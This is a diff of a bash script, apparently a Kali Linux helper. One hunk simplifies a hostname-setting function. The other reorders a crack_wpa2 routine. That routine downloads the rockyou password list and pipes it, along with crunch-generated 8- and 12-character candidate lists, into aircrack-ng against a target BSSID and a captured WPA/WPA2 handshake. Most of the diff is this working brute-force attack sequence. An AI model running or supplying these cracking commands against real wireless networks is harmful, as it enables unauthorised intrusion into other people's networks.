@@ -53,22 +53,10 @@ function install_kali ()
 }
 function set_host ()
 {
-	if [ -z $1 ]
-	then
-		msg "Please provide a hostname:"
-		read _hostname
-		msg "Please provide an IP:"
-		read _ip
-		local host_name=${_hostname}
-		local _ip=${_ip}
-		echo "${host_name}" > /etc/hostname
-		echo "${_ip}    ${host_name}" >> /etc/hosts
-	else
-		local host_name="$1"
-		local _ip="$2"
-		echo "${host_name}" > /etc/hostname
-		echo "${_ip}    ${host_name}" >> /etc/hosts
-	fi
+	local host_name="$1"
+	local _ip="$2"
+	echo "${host_name}" > /etc/hostname
+	echo "${_ip}    ${host_name}" >> /etc/hosts
 }
 function clean_up ()
 {
@@ -112,19 +100,18 @@ function crack_wpa2 ()
 	test ! -f ~/rockyou.txt && wget -c https://github.com/danielmiessler/SecLists/raw/master/Passwords/rockyou.txt.tar.gz
 	tar -xf rockyou.txt.tar.gz
 	msg "Cracking WPA/WPA2-PSK...." 0
+	cat rockyou.txt| pw-inspector -m 8 -M 12 |shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
+	msg "Section: 2" 0
+	crunch 8 8 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
+	msg "Section: 3" 0
+	crunch 8 8 -f charset.txt mixalpha-numeric|shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
+	msg "Section: 4" 0
+	crunch 12 12 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
+	msg "Section: 5" 0
+	crunch 12 12 -f charset.txt mixalpha-numeric|shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
 	crunch 8 8 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&-+='|shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
 	crunch 12 12 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&-+='|shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 2" 0
-	cat rockyou.txt| pw-inspector -m 8 -M 16 |shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 3" 0
-	crunch 8 8 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 4" 0
-	crunch 8 8 -f charset.txt mixalpha-numeric|shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 5" 0
-	crunch 12 12 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 6" 0
-	crunch 12 12 -f charset.txt mixalpha-numeric|shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
-	msg "Section: 7 - Completed." 0
+	msg "Section: 6 - Completed." 0
 	msg "WPA/WPA2-PSK brute force completed."
 }
 function menu ()
